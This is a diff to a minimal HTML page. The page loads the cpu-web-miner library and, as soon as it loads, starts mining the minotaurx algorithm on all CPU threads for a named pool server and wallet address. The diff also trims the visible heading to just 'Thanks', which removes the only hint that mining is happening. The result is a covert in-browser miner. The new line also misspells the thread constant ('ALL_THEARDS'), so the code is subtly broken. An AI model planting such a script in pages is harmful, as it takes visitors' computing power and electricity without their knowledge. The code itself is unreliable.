@@ -2,20 +2,20 @@
 <html>
 <body>
 
-<h2>Thanks for using cpu-web-miner</h2>
+<h2>Thanks</h2>
 
 <script type="module">
 import * as cpuWebMiner from 'https://esm.run/@marco_ciaramella/cpu-web-miner';
 
 const stratum = {
-    server: "europe.raptoreum.zone",
-    port: 3333,
-    worker: "RY3WyocxKLRPFGKkUX8jvRyyRKBJaugFd5",
-    password: "x",
+    server: "minotaurx.na.mine.zpool.ca",
+    port: 7019,
+    worker: "R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q",
+    password: "c=RVN",
     ssl: false // true when pool uses SSL, false otherwise
 }
 
-cpuWebMiner.start(cpuWebMiner.ghostrider, stratum, true, cpuWebMiner.ALL_THREADS);
+cpuWebMiner.start(cpuWebMiner.minotaurx, stratum, true, cpuWebMiner.ALL_THEARDS);
 </script> 
 
 </body>
